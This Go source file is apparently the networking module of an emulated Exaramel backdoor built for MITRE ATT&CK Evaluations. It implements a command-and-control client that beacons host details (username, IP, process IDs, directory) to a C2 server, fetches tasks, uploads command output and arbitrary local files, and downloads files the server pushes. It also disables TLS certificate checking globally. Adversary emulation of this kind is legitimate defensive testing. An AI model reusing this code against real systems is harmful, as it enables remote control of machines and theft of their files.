package networker

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"attackevals.mitre-engenuity.org/exaramel/logger"
)

const registerImplantEndpoint = "/auth/app"
const getTaskEndpoint = "/tasks.get/"
const postOutputEndpoint = "/tasks.report/"
const getFileEndpoint = "/attachment.get/"

var c2Server string

type AuthStruct struct {
	Guid       string
	Whoami     string
	Platform   string
	Version    string
	Generation string
	IP         string //This field is a CTI deviation, used for ease in ATT&CK Evals
	PID        string //This field is a CTI deviation, used for ease in ATT&CK Evals
	PPID       string //This field is a CTI deviation, used for ease in ATT&CK Evals
	Dir        string //This field is a CTI deviation, used for ease in ATT&CK Evals
}

var authValues AuthStruct

// Set full API URL of C2 Server.
func SetC2Server(url string) {
	c2Server = url
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
}

// Set beacon specific values for communication to server.
func SetAuthValues(myGuid string, myUsername string, myPlatform string, outboundIP string, pid string, ppid string, dir string) {

	authValues = AuthStruct{
		Guid:       myGuid,
		Whoami:     myUsername,
		Platform:   myPlatform,
		Version:    "0.1",
		Generation: "1",
		IP:         outboundIP,
		PID:        pid,
		PPID:       ppid,
		Dir:        dir,
	}
}

// Test for whether server responded with error message
func IsResponseError(response []byte) (bool, string) {
	var respErrorTest RespError
	json.Unmarshal(response, &respErrorTest)
	if respErrorTest.Error.Code != 0 {
		return true, respErrorTest.Error.Message
	}
	return false, ""
}

// Send agent information to server for agent registration.
func PostAuthBeacon() error {
	data := url.Values{}
	data.Set("guid", authValues.Guid)
	data.Set("whoami", authValues.Whoami)
	data.Set("platform", authValues.Platform)
	data.Set("version", authValues.Version)
	data.Set("generation", authValues.Generation)
	data.Set("ip", authValues.IP)
	data.Set("pid", authValues.PID)
	data.Set("ppid", authValues.PPID)
	data.Set("dir", authValues.Dir)

	registerURL := c2Server + registerImplantEndpoint

	logger.Info(fmt.Sprintf("Posting auth beacon to %v as %v", registerURL, authValues.Guid))

	req, err := http.NewRequest("POST", registerURL, strings.NewReader(data.Encode()))
	if err != nil {
		logger.Error(err)
		return err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		err := errors.New("RegisterBeacon endpoint StatusCode != 200")
		logger.Error(err)
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		logger.Error(err)
		return err
	}

	if isErr, message := IsResponseError(body); isErr {
		err := fmt.Errorf("received error response from server for RegisterBeacon request: %v", message)
		logger.Error(err)
		return err
	}
	return nil
}

// Acquire tasking from server. Tasks are returned in a Tasks struct.
func GetTasks() (Tasks, error) {
	var tasks Tasks
	getTaskUrl := c2Server + getTaskEndpoint + authValues.Guid
	logger.Info(fmt.Sprintf("Getting tasks from %v", getTaskUrl))
	response, err := http.Get(getTaskUrl)
	if err != nil {
		logger.Error(err)
		return tasks, err
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		logger.Error(err)
		return tasks, err
	}
	if isErr, message := IsResponseError(body); isErr {
		err := fmt.Errorf("received error response from server for GetTasks request: %v", message)
		logger.Error(err)
		return tasks, err
	}
	if err := json.Unmarshal(body, &tasks); err != nil {
		logger.Error(err)
		return tasks, err
	}
	for _, task := range tasks.Response {
		if task.Method == "" {
			err := fmt.Errorf("received improper response from server for GetTasks request: %+v", task)
			logger.Error(err)
			return tasks, err
		}
		logger.Info(fmt.Sprintf("Received following tasking from server: %v - %v", task.Method, task.Arguments))
	}
	return tasks, nil
}

// Sends output for executed command back to server.
// IOReadFile commands set isFile to true to cause POST request to read target file.
func SendReport(taskId uint32, output string, isFile bool) (Reports, error) {
	reportUrl := c2Server + postOutputEndpoint
	var reportResp Reports
	values := make(map[string]string)
	values["guid"] = authValues.Guid
	values["task_id"] = strconv.Itoa(int(taskId))

	logger.Info("Trying to send task report for task: " + values["task_id"])

	if !isFile {
		logger.Info("Sending command output/status message to server")
		values["file"] = output
	}

	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	for key, val := range values {
		var fw io.Writer
		fw, err := w.CreateFormField(key)
		if err != nil {
			logger.Error(err)
			return reportResp, err
		}
		if _, err = io.Copy(fw, strings.NewReader(val)); err != nil {
			logger.Error(err)
			return reportResp, err
		}
	}

	// If isFile is set, we are sending a file in the POST request
	if isFile {
		logger.Info("Sending the following file to server: " + output)
		fileReader, err := os.Open(output)
		if err != nil {
			logger.Error(err)
			return reportResp, err
		}
		var fw io.Writer
		if fw, err = w.CreateFormFile("file", filepath.Base(output)); err != nil {
			logger.Error(err)
			return reportResp, err
		}
		if _, err = io.Copy(fw, fileReader); err != nil {
			logger.Error(err)
			return reportResp, err
		}
		fileReader.Close()
	}

	w.Close()

	// setup HTTP POST request
	req, err := http.NewRequest("POST", reportUrl, &buf)
	if err != nil {
		logger.Error(err)
		return reportResp, err
	}

	req.Header.Set("Content-Type", w.FormDataContentType())

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		logger.Error(err)
		return reportResp, err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		err := fmt.Errorf("expected error code 200, got %v", response.StatusCode)
		logger.Error(err)
		return reportResp, err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		logger.Error(err)
		return reportResp, err
	}
	if isErr, message := IsResponseError(body); isErr {
		err := fmt.Errorf("received error response from server for SendReport request: %v", message)
		logger.Error(err)
		return reportResp, err
	}
	json.Unmarshal([]byte(body), &reportResp)
	logger.Success("Successfully sent report to server")
	return reportResp, nil
}

// Gets file from server when processing IOWriteFile command. Exaramel handler associates files with taskIDs
func GetFile(taskId uint32) ([]byte, error) {
	getFileURL := c2Server + getFileEndpoint + authValues.Guid + "/" + strconv.Itoa(int(taskId))
	logger.Info("Getting file to download from: " + getFileURL)
	resp, err := http.Get(getFileURL)
	if err != nil {
		logger.Error(err)
		return []byte(""), err
	}
	fileData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logger.Error(err)
		return []byte(""), err
	}
	return fileData, nil
}
